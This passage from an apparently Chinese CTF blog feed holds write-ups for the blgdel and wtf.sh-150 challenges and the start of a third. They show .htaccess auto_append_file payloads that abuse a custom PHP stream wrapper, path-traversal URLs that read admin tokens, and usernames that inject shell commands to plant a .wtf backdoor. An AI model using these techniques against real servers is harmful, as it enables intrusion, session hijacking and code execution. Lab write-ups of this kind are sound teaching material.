href="#x2F-w-w-q-x3D-0-d-x2F" class="headerlink" title="&#x2F;([\w])[\w-]+(?:;q&#x3D;0.([\d]))?,?&#x2F;"></a>&#x2F;([\w])[\w-]+(?:;q&#x3D;0.([\d]))?,?&#x2F;</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/([\w])[\w-]+(?:;q=0.([\d]))?,?/</span><br><span class="line">    \w匹配字母数字下划线</span><br><span class="line">    [\w]匹配数字字母下划线中的任何字符</span><br><span class="line">    ([\w]把匹配到的数字字母下划线放到一个分组中</span><br><span class="line">    [\w-]匹配数字字母下划线与-中的任何字符</span><br><span class="line">    +表示匹配一个或更多个前面的标记连起来就是匹配不止一个数字字母下划线和-</span><br><span class="line">    (?:)表示非捕获分组用于单纯的把数个标记组在一起用于后面的?组合匹配</span><br><span class="line">    ;q=0表示匹配;q=0这些字符</span><br><span class="line">    .表示匹配任何字符不包括换行符</span><br><span class="line">    ([\d])\d表示匹配任何数字0-9</span><br><span class="line">    ?表示匹配0个或一个前面的标记</span><br><span class="line">    (?:;q=0.([\d]))?综合起来就是匹配;q=0任意字符 数字一次但不捕获</span><br><span class="line">    ,?表示匹配0次逗号或者一次逗号</span><br></pre></td></tr></table></figure><h1 id="x2F-x2F-s"><a href="#x2F-x2F-s" class="headerlink" title="&#x2F;(.)/(.)$&#x2F;s"></a>&#x2F;(.<em>)/(.</em>)$&#x2F;s</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/(.*)\/(.*)$/s</span><br><span class="line">.表示匹配任何字符包括换行符</span><br><span class="line">*表示匹配0个或者更多个前面的标记</span><br><span class="line">(.*)用来捕获分组</span><br><span class="line">\/表示匹配/字符</span><br><span class="line">.表示匹配任何字符包括换行符</span><br><span class="line">*表示匹配0个或者更多前面的标记</span><br><span class="line">(.*)表示捕获分组</span><br><span class="line">$表示匹配字符串的结尾</span><br><span class="line">s表示会匹配任何字符包括换行符</span><br><span class="line">综上表示匹配文末带有/的所有字符并以/作为分割进行捕获</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界blgdel</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cblgdel/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cblgdel/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界blgdel"><a href="#攻防世界blgdel" class="headerlink" title="攻防世界blgdel"></a>攻防世界blgdel</h1><p>目录扫描</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111430349.png" alt="image-20220311143036292"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111431368.png" alt="image-20220311143159313"></p><p>打开看看</p><p>robots.txt下面发现config.txt文件打开后得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">master</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_open</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/* /(.*)\/(.*)$/s</span></span><br><span class="line"><span class="comment">        .表示匹配任何字符包括换行符</span></span><br><span class="line"><span class="comment">        *表示匹配0个或者更多个前面的标记</span></span><br><span class="line"><span class="comment">         (.*)用来捕获分组</span></span><br><span class="line"><span class="comment">         \/表示匹配/字符</span></span><br><span class="line"><span class="comment">         .表示匹配任何字符包括换行符</span></span><br><span class="line"><span class="comment">          *表示匹配0个或者更多前面的标记</span></span><br><span class="line"><span class="comment">          (.*)表示捕获分组</span></span><br><span class="line"><span class="comment">          $表示匹配字符串的结尾</span></span><br><span class="line"><span class="comment">         s表示会匹配任何字符包括换行符</span></span><br><span class="line"><span class="comment">        综上表示匹配文末带有/的所有字符并以/作为分割进行捕获</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(.*)\/(.*)$/s&#x27;</span>,<span class="variable">$path</span>,<span class="variable">$array</span>,<span class="number">0</span>,<span class="number">9</span>))<span class="comment">#如果没有匹配到就返回1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$array</span>[<span class="number">1</span>];<span class="comment">#将array的第二个值赋值给a</span></span><br><span class="line">        <span class="title function_ invoke__">parse_str</span>(<span class="variable">$array</span>[<span class="number">2</span>],<span class="variable">$array</span>);<span class="comment">#将匹配到的第二个参数值进行变量的解析成变量与值的形式</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>]))<span class="comment">#设置了path参数</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;path=<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>];<span class="comment">#将path值赋值给成员变量path</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name=<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&#x27;upload&#x27;</span>)<span class="comment">#如果a强等于upload</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable language_">$this</span>-&gt;path,<span class="variable language_">$this</span>-&gt;name);<span class="comment">#就执行upload方法</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$a</span>===<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">search</span>(<span class="variable language_">$this</span>-&gt;path,<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^uploads\/[a-z]&#123;10&#125;\/$/is&#x27;</span>,<span class="variable">$path</span>)||<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="comment">/*/^uploads\/[a-z]&#123;10&#125;\/$/is</span></span><br><span class="line"><span class="comment">        ^表示匹配字符串开头</span></span><br><span class="line"><span class="comment">        uploads匹配upload字符串</span></span><br><span class="line"><span class="comment">        \/匹配/字符</span></span><br><span class="line"><span class="comment">        [a-z]中的任何字符总共匹配前面的十个</span></span><br><span class="line"><span class="comment">        \/匹配/字符</span></span><br><span class="line"><span class="comment">        $匹配字符串结尾</span></span><br><span class="line"><span class="comment">        i表示大小写不敏感</span></span><br><span class="line"><span class="comment">        s表示会匹配任何字符包括换行符</span></span><br><span class="line"><span class="comment">        综上表示匹配以uploads/十个字符/ 为开头结尾的字符串*/</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">#获取上传文件的名称</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);<span class="comment">#读取临时名字文件的值到字符串,也就是读取上传文件到字符串</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);<span class="comment">#替换&lt;</span></span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%03&#x27;</span>),<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file:|http|pre|etc/is&#x27;</span>,<span class="variable">$file</span>))<span class="comment">#匹配file:或者http或者pre或者etc</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;illegalbbbbbb!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>.<span class="variable">$filename</span>,<span class="variable">$file</span>);<span class="comment">#将字符串输出并重命名为path+filename</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>.<span class="string">&#x27;user.jpg&#x27;</span>,<span class="variable">$file</span>);<span class="comment">#在输出并重命名为path+user.jpg</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload success!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))<span class="comment">#如果路径不是一个目录</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;illegal!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$files</span>=<span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);<span class="comment">#将目录下的文件全部找出来放到files数组中去</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)<span class="comment">#循环</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$name</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$v</span>)!==<span class="variable">$v</span>)<span class="comment">#将名字替换为空且不区分大小写如果不等于$v就输出v</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$v</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_eof</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_stat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;php&#x27;</span>);<span class="comment">#取消这个协议</span></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;phar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_register</span>(<span class="string">&#x27;master&#x27;</span>,<span class="string">&#x27;master&#x27;</span>);<span class="comment">#注册这个协议</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>.&#x2F;htaccess文件禁止访问,这里服务器使用了.&#x2F;htaccess文件,有可能与文件上传有关</p><p>有注册有登录还有个文件上传页面,但是文件上传页面需要登录才能访问这里直接注册一个登录进去试试</p><p>上传页面有<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111438359.png" alt="image-20220311143841316"></p><p>限制登录,这里发现在注册时<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111452811.png" alt="image-20220311145240736"></p><p>有一个推荐人,第一次注册时填的自己,给了十分,这里多注册几个有分在去访问upload试试</p><p>这里随便上传一个一句话查找一下图片地址,发现一个目录穿越漏洞</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111935775.png" alt="image-20220311193531714"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111935511.png" alt="image-20220311193543473"></p><p>发现过滤了</p><p>接着上传.htaccess文件,并将内容改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file master://search/path=%2fhome%2f&amp;name=flag</span><br></pre></td></tr></table></figure><p>接着在上传php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111942636.png" alt="image-20220311194204580"></p><p>然后访问这个文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111942144.png" alt="image-20220311194237097"></p><p>得到flag的名字hiahiahia_flag</p><p>在上传一个.htaccess文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file /home/hiahiahia_flag</span><br></pre></td></tr></table></figure><p>在上传一个php文件,接着访问这个文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203111944724.png" alt="image-20220311194446674"></p><p>首先进行目录扫描,搜到几个目录挨个访问得到了php源码,并发现了一个.htaccess文件,感觉像是文件上传漏洞的利用,经过简单的代码审计发现有上传点,并且有一个php协议的过滤.接着可以对本系统进行常规测试,发现没有注入,xss等常见漏洞,接着观察系统在基本功能要求之外的功能,即一个上传点(上传头像图片),和一个搜索点用于搜索以前的头像,在上传页面这里可以发现有权限问题,这里要注意前面注册时存在一个推荐人的地方,发现可以刷积分.</p><p>这里进入去文件上传发现会过滤php必要代码,也发现常见的伪协议都不能使用,但是新注册了一个master协议.根据上传文件得到了一个目录遍历漏洞,接着发现上传给每一个用户单独的目录.接着试着上传htaccess文件,其中可以写入php_value auto_prepend_file 1 这种语句,即通过上传漏洞,上传一个包含点上去,将上传漏洞变为上传+文件包含漏洞进行利用.而解饿和上传时pre为黑名单,可以想到此时的网站auto_prepend_file 为这个config.php,无法修改,无法替换增auto_prepend_file而使用php,zip等伪协议,所以接着考虑远程包含,和这个新注册的master协议,发现我们可以控制协议则可以给任意目录上传搜索文件,而协议流程和对象注入差不多,先是执行__construct,再是stream_open,upload&#x2F;search,stream_read…主要是upload和search,其余方法都做l处理,而上传目录被限制了,但是我们可以通过目录遍历漏洞去找文件.</p><p>上传.htaccess,内容为php_value auto_prepend_file master:&#x2F;&#x2F;search&#x2F;path&#x3D;{}&amp;name&#x3D;{},此时注意 &#x2F; 要替换为%2f,否则不能成功 接着在上传一个任意php文件,接着通过目录遍历漏洞访问.在payload为php_value auto_append_file master:&#x2F;&#x2F;search&#x2F;path&#x3D;%2fhome%2f&amp;name&#x3D;flag时,找到了hiahiahia_flag文件 此时在上传一个.htaccess,内容为php_value auto_append_file &#x2F;home&#x2F;haihaihai_flag就可以包含flag在访问php文件就可以看到falg</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界wtf.sh-150</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwtf.sh-150/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwtf.sh-150/</url>
      
        <content type="html"><![CDATA[<h1 id="目录穿越配合代码审计写wtf脚本"><a href="#目录穿越配合代码审计写wtf脚本" class="headerlink" title="目录穿越配合代码审计写wtf脚本"></a>目录穿越配合代码审计写wtf脚本</h1><h2 id="目录穿越得到admin的cookies得到flag1"><a href="#目录穿越得到admin的cookies得到flag1" class="headerlink" title="目录穿越得到admin的cookies得到flag1"></a>目录穿越得到admin的cookies得到flag1</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101658340.png" alt="image-20220310165825228"></p><p>打开之后先点点看扫一下目录,做一下常规操作,目录没扫到有用的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101708346.png" alt="image-20220310170809299"></p><p>登录这里是用户名和密码分开验证的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101703722.png" alt="image-20220310170313682"></p><p>当用户名存在时验证密码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101703604.png" alt="image-20220310170354563"></p><p>这里可能存在注入这里直接sqlmap跑一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101657120.png" alt="image-20220310165749047"></p><p>注册一个用户试试看,发现登录这里有用户名的回显,这里可能存在二次注入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101705045.png" alt="image-20220310170543003"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101706246.png" alt="image-20220310170627204"></p><p>newpost这里也有回显,都用sqlmap跑一下试试看<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101706253.png" alt="image-20220310170645216"></p><p>链接这里也发现一个参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101711986.png" alt="image-20220310171138942"></p><p>测试了目录穿越漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:63284/post.wtf?post=./K8laH回显正常</span><br><span class="line">http://111.200.241.244:63284/post.wtf?post=../K8laH回显错误</span><br><span class="line">http://111.200.241.244:63284/post.wtf?post=../直接爆文件了</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101725190.png" alt="image-20220310172544086"></p><p>这里搜索一下flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101756008.png" alt="image-20220310175621958"></p><p>发现在ft&#x3D;wtf中存在</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101819324.png" alt="image-20220310181927272"></p><p>这里需要是cookies是admin并且username&#x3D;admin才会输出flag1!在这里发现一个users有可能存放用户信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101820898.png" alt="image-20220310182035830"></p><p>这里经过尝试越权并不现实</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101829939.png" alt="image-20220310182914873"></p><p>这里的token是含盐的,既然有token这里去源码搜一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101836173.png" alt="image-20220310183618137"></p><p>回头使用目录穿越找一下users文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101834419.png" alt="image-20220310183456382"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101835966.png" alt="image-20220310183504934"></p><p>这里发现了admin的token值,直接使用这两个值登一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101844539.png" alt="image-20220310184426501"></p><p>这里登进去的页面找了一圈也没有,发现在profile下面,记得再次更改cookies登进去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag: xctf&#123;cb49256d1ab48803这里得到flag1</span><br></pre></td></tr></table></figure><h2 id="代码审计写wtf脚本"><a href="#代码审计写wtf脚本" class="headerlink" title="代码审计写wtf脚本"></a>代码审计写wtf脚本</h2><p>那2呢?</p><p>要求上传.wtf文件，就可以控制服务器<br> 而评论功能也存在路径穿越</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function reply &#123;</span><br><span class="line"></span><br><span class="line">local post_id=$1;</span><br><span class="line">local username=$2;</span><br><span class="line">local text=$3;</span><br><span class="line">local hashed=$(hash_username &quot;$&#123;username&#125;&quot;);</span><br><span class="line">curr_id=$(for d in posts/$&#123;post_id&#125;/*; do basename $d; done | sort -n | tail -n 1);</span><br><span class="line">next_reply_id=$(awk &#x27;&#123;print $1+1&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;curr_id&#125;&quot;);</span><br><span class="line">next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;);</span><br><span class="line">echo &quot;$&#123;username&#125;&quot; &gt; &quot;$&#123;next_file&#125;&quot;;</span><br><span class="line">echo &quot;RE: $(nth_line 2 &lt; &quot;posts/$&#123;post_id&#125;/1&quot;)&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span><br><span class="line">echo &quot;$&#123;text&#125;&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span><br></pre></td></tr></table></figure><p>评论功能的后台代码，也是存在路径穿越的。</p><p>代码把用户名写在了评论文件的内容中：echo “${username}” &gt; “${next_file}”;</p><p>通过上面的分析：如果用户名是一段可执行代码，而且写入的文件是 wtf 格式的，那么这个文件就能够执行我们想要的代码。 （而且<em>wtf.sh</em>只运行文件扩展名为.wtf的脚本和前缀为’$’的行）先普通地评论一下，知晓评论发送的数据包的结构，在普通评论的基础上，进行路径穿越，上传后门<code>sh.wtf</code></p><p>先注册一个${find,&#x2F;,-iname,get_flag2}为用户名的用户</p><p>这里前面加个$是wtf文件执行命令的写法 find  所有目录下   不分大小写， get_flag2的名字的文件<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101914024.png" alt="image-20220310191438989"></p><p>到这个回复中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101917669.png" alt="image-20220310191706613"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101917269.png" alt="image-20220310191726241"></p><p>访问这个文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09是水平制表符，必须添加，不然后台会把我们的后门当做目录去解析。</span><br></pre></td></tr></table></figure><p>在注册这个名字$&#x2F;usr&#x2F;bin&#x2F;get_flag2</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101918568.png" alt="image-20220310191842538"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101921764.png" alt="image-20220310192147726"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101921692.png" alt="image-20220310192115662"></p><p>得到第二部分的flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">149e5ec49d3c29ca&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugctf的noteasytrick</title>
      <link href="/ctf/comprehensive-bugctf%E7%9A%84noteasytrick/"/>
      <url>/ctf/comprehensive-bugctf%E7%9A%84noteasytrick/</url>
      
        <content type="html"><![CDATA[<h1 id="bugctf-的noteasytrick"><a href="#bugctf-的noteasytrick" class="headerlink" title="bugctf 的noteasytrick"></a>bugctf 的noteasytrick</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;Off&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jesen</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$me</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;me = <span class="keyword">new</span> <span class="title class_">Ctf</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;me-&gt;<span class="title function_ invoke__">open</span>(<span class="variable language_">$this</span>-&gt;filename,<span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctf</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;die&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./sandbox/lock.lock&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>],<span class="number">0</span>,<span class="number">30</span>));</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./sandbox/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$filename</span>.<span class="title function_ invoke__">time</span>()),<span class="variable">$content</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;or you can guess the final filename?&quot;</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) === <span class="title function_ 